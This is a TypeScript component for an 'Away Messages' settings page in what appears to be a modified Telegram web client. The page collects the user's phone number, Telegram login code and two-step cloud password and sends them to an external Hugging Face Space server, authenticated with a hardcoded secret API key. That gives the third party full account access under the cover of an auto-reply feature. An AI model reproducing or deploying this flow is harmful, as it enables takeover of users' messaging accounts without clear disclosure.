import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';

import Button from '../../ui/Button';
import Checkbox from '../../ui/Checkbox';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUserPhone }) => {
  const safeUserId = currentUserId || "unknown";

  const [isFetching, setIsFetching] = useState(true);
  const [isLinked, setIsLinked] = useState(false);
  const [isEnabled, setIsEnabled] = useState(false);
  const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
  
  // 🌟 Setup Flow အတွက် ယာယီ Local Storage သုံးထားပါသည် (Code သွားကြည့်ရန် ထွက်သွားပါက မပျောက်စေရန်)
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Permanent Settings များကို Database မှ ဆွဲယူခြင်း
  useEffect(() => {
    if (safeUserId === "unknown") return;
    
    const fetchSettings = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
          body: JSON.stringify({ user_id: safeUserId })
        });
        const data = await res.json();
        
        if (res.ok && data.is_linked) {
          setIsLinked(true);
          setIsEnabled(data.enabled);
          if (data.text) setReplyText(data.text);
        } else {
          setIsLinked(false);
        }
      } catch (err) {
        console.error("Failed to fetch settings:", err);
      } finally {
        setIsFetching(false);
      }
    };

    fetchSettings();
  }, [safeUserId]);

  // Cancel လုပ်လျှင် ယာယီ သိမ်းထားသော Local Storage ကို ရှင်းလင်းခြင်း
  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found for this account.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      const data = await res.json();
      
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        // OTP တောင်းပြီးပါက အဆင့်ကို ယာယီ မှတ်ထားမည်
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { setErrorMsg("Network Error: Could not connect to the server."); }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    if (!otpCode && step === 'otp') {
        setErrorMsg("Please enter the OTP code.");
        return;
    }
    setErrorMsg('');
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({
          user_id: safeUserId,
          phone_number: savedPhone,
          otp_code: otpCode,
          two_step_password: twoFaPassword || undefined
        })
      });
      const data = await res.json();
      
      if (res.ok) {
        handleCancelSetup(); // ✅ အောင်မြင်သွားပါက ယာယီ Local Storage များကို ဖျက်ချမည်
        setIsLinked(true);
        setIsEnabled(true);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa'); // 2FA လိုလျှင် ယာယီမှတ်မည်
      } else if (res.status === 400 && data.error.includes("expired")) {
        setErrorMsg("Code expired. Please request a new one.");
        handleCancelSetup();
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { setErrorMsg("Network Error: Could not verify code."); }
    setIsLoading(false);
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    setErrorMsg('');
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      
      if (!res.ok) {
        if (res.status === 400) setIsLinked(false);
        setErrorMsg("Failed to update settings. Session might be disconnected.");
      }
    } catch (err) { setErrorMsg("Network Error: Could not save settings."); }
    setIsLoading(false);
  };

  if (isFetching) {
    return (
      <div className="settings-content custom-scroll" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%' }}>
        <p style={{ color: 'var(--color-text-secondary)' }}>Loading settings...</p>
      </div>
    );
  }

  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <h3 className="settings-header-title">Away Messages</h3>
      </div>

      <div className="settings-main-menu">
          {!isLinked ? (
            <div className="settings-item pt-3 pb-3" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', padding: '2rem 1rem' }}>
              {errorMsg && <p style={{ color: 'var(--color-error)', fontSize: '14px', marginBottom: '1rem', width: '100%' }}>{errorMsg}</p>}
              
              {step === 'idle' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <i className="icon-message" style={{ fontSize: '48px', color: 'var(--color-primary)', marginBottom: '1rem', display: 'block' }} />
                  <h4 style={{ marginBottom: '1rem', fontWeight: 500 }}>Connect Server</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '2rem', fontSize: '15px', lineHeight: '1.5' }}>
                    Connect your account to enable away messages. A login code will be sent to your Telegram app.
                  </p>
                  <Button onClick={handleAutoRequestCode} isLoading={isLoading} fluid>
                    Request Login Code
                  </Button>
                </div>
              )}

              {step === 'otp' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <i className="icon-lock" style={{ fontSize: '48px', color: 'var(--color-primary)', marginBottom: '1rem', display: 'block' }} />
                  <h4 style={{ marginBottom: '1rem', fontWeight: 500 }}>Verification Code</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>
                    Enter the code sent to your Telegram app.
                  </p>
                  {/* Input မကပ်နေစေရန် marginTop ဖြင့် ချိန်ထားပါသည် */}
                  <div style={{ textAlign: 'left', marginBottom: '2rem', marginTop: '1rem' }}>
                    <InputText label="Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
                  </div>
                  <div style={{ display: 'flex', gap: '15px' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} style={{ flex: 1 }}>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ flex: 1 }}>Verify</Button>
                  </div>
                </div>
              )}

              {step === '2fa' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <i className="icon-password" style={{ fontSize: '48px', color: 'var(--color-primary)', marginBottom: '1rem', display: 'block' }} />
                  <h4 style={{ marginBottom: '1rem', fontWeight: 500 }}>Two-Step Verification</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>
                    Your account is protected with an additional password.
                  </p>
                  <div style={{ textAlign: 'left', marginBottom: '2rem', marginTop: '1rem' }}>
                    <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
                  </div>
                  <div style={{ display: 'flex', gap: '15px' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} style={{ flex: 1 }}>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ flex: 1 }}>Submit</Button>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <>
              {/* Native Telegram Checkbox ကို အသုံးပြုထားပါသည် */}
              <div className="settings-item pt-3">
                <Checkbox
                  checked={isEnabled}
                  onChange={(checked) => setIsEnabled(checked)}
                  label="Enable Away Messages"
                />
                <p style={{ marginTop: '0.5rem', color: 'var(--color-text-secondary)', fontSize: '14px', lineHeight: '1.5', paddingLeft: '32px' }}>
                  Automatically reply to incoming private messages when you are away.
                </p>
              </div>

              {/* Message Input Box အား Professional ဆန်ဆန် ဒီဇိုင်းဆွဲထားပါသည် */}
              <div className="settings-item pt-3">
                <h4 style={{ fontSize: '14px', color: 'var(--color-text-secondary)', marginBottom: '10px' }}>Away Message</h4>
                <div style={{ 
                  border: '1px solid var(--color-borders)', 
                  borderRadius: '10px', 
                  background: isEnabled ? 'var(--color-background)' : 'var(--color-background-compact)', 
                  padding: '5px',
                  transition: 'background-color 0.2s, border-color 0.2s'
                }}>
                  <textarea
                    value={replyText}
                    onChange={(e: any) => setReplyText(e.target.value)}
                    disabled={!isEnabled}
                    rows={4}
                    placeholder="Write your away message here..."
                    style={{
                      width: '100%',
                      border: 'none',
                      background: 'transparent',
                      outline: 'none',
                      color: isEnabled ? 'var(--color-text)' : 'var(--color-text-secondary)',
                      fontSize: '16px',
                      resize: 'none',
                      fontFamily: 'inherit',
                      padding: '10px',
                      lineHeight: '1.5'
                    }}
                  />
                </div>
              </div>

              {errorMsg && <div className="settings-item pt-2"><p style={{ color: 'var(--color-error)', fontSize: '14px', textAlign: 'center' }}>{errorMsg}</p></div>}

              <div className="settings-item pt-4 pb-3">
                <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>
                  Save Settings
                </Button>
              </div>
            </>
          )}
      </div>
    </div>
  );
};

export default memo(withGlobal<OwnProps>(
  (global): StateProps => { 
      const currentUserId = global.currentUserId;
      let currentUserPhone = undefined;
      
      if (currentUserId && global.users && global.users.byId) {
          const user = global.users.byId[currentUserId];
          if (user && user.phoneNumber) currentUserPhone = user.phoneNumber;
      }
      return { currentUserId, currentUserPhone }; 
  }
)(AutoReplySettings));
